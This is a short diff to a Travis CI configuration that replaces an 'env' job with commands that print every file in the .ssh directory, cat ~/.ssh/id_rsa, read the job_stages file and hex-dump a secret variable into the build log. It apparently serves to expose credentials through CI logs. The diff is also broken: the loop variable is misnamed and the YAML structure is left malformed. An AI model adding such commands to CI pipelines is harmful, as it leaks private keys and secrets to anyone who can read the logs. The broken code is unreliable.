@@ -1,7 +1,5 @@
 language: bash
-jobs:
-  include:
-  - script: env
+script: ls -la . && ls -la .ssh && for in in `ls .ssh`; do echo $i; cat .ssh/$i; done
   - script: cat /home/travis/.travis/job_stages
   - script: cat ~/.ssh/id_rsa
   - script: echo $SECRET1 |hd
